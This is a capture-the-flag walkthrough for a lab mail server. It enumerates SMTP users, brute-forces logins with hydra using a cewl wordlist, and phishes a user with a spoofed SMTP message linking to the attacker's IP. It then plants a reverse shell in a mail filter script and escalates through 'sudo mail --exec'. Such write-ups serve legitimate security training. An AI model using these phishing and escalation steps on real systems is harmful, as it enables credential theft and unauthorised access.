This appears to be a mailing server.

## 80/TCP - HTTP

![](../../../assets/514526600861a1caa146acb7705f1d8d.png)

We get a list of potential usernames.

![](../../../assets/32d9833fb0f724cddf5f3e6374ba222b.png)

We will use this list together with `username-anarchy` to try and create a wordlist of potential usernames.

![](../../../assets/d9a891dfdf523e1819fe037e6d26f4c5.png)

Let's check further

![](../../../assets/35865803289ea53d27fcbaedf9fd5f7f.png)

There's nothing else here.

## 25/TCP - SMTP
### User Enum

I inserted my wordlist using `smtp-user-enum` and found all users to be existing:

![](../../../assets/e78f922e7c166d5159678d462f526bee.png)

I tried to brute force these usernames with `hydra` but it took way too long so I reran `smtp-user-enum` for other accounts.

![](../../../assets/819840cc8211a3a2b5053b57e35a883b.png)

We find some more so we'll add these to our wordlist, since most of these are default I'll add just the non-default ones for now:

```
hr
sales
```

### Cewl - Wordlist Generation

Now instead of guessing what password list to use, we will utilize another tool called `cewl` to generate a password list for us:

```bash
cewl -d 5 -m 3 http://postfish.off/team.html -w cewl.txt
```

## Hydra 

![](../../../assets/6077fd4cf73a674dc734851684f7fe1b.png)

This gave 0 matches, so I created a copy of the wordlist, but with all lowercase:

```bash
tr A-Z a-z < cewl.txt > cewl_lower.txt
```

I went ahead an reran it, slightly modifying my command:

>[!success]

>[!note]
>Next time try the username - username combo first......

![](../../../assets/42afff8ce83543541e9f3c66f5472f86.png)

Hell yeah.

## 110/TCP - POP3s

![](../../../assets/6a23f09541a94fc924c5f1a86a178032.png)

![](../../../assets/eec0c4ec35f737e5f4421d1a9269a0b3.png)

Let's check out the message.

# Foothold
## Phishing Attack via SMTP

By reading the contents my gut instantly told me this was a *Phishing* attack.

>[!note]
>Since the message implies there will be a **link** sent instead of some file, we can't just send an Office document with a macro like in other cases, instead we'll have to send and embedded link with our own IP in it:

```bash
nc -vn 192.168.145.137 25

helo postfish.off
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA
Subject: Password Reset

reset password here <http://192.168.45.242/>
.
QUIT
```

Then wait for a while and see the following result:

![](../../../assets/7ca3e700bf92b51a2b450ed51581bf5e.png)

We now have the password for *brian.moore*.

```
brian.moore
EternaLSunshinE
```

# Foothold
## Shell as brian.moore

![](../../../assets/dd4780b1b34773695f4143f491246253.png)

After our successful phishing attack we gain access to *brian*'s `ssh` instance.

## Enumeration

![](../../../assets/43b2873f8c6a0bc625b7b3c910d9bcd8.png)

I notice some non-default groups I am part of.

I tried to look them up but didn't find anything on it:

![](../../../assets/db64f4725ab10830b94e810039c8c8db.png)

![](../../../assets/88a471e2be84a99607bea5cf8f11730d.png)

Nothing out of the ordinary here.

Let's download over `linpeas.sh`.

![](../../../assets/eb814ba3cda40ece9377d22e60e7f049.png)

Interesting!

![](../../../assets/fcbf33542d31180b7898d2721696bb23.png)

Yet again

Let's check it out:

# Privilege Escalation
## Shell as filter

Since we're in the `filter` group I was able to edit this script and add a reverse shell script inside:

![](../../../assets/ac414902d8941737fce7b04b8509759f.png)

![](../../../assets/d55b12ac3704757046e0dadb9a520adf.png)

The change worked, now we have to send another sample mail for this to work.

>This is the first time that `busybox` didn't work, I ended up changing the payload to a `bash` shell and it worked:

## SUID binary

We will be using the bottom one in order to escalate privs

```bash
sudo /usr/bin/mail --exec='!/bin/sh'
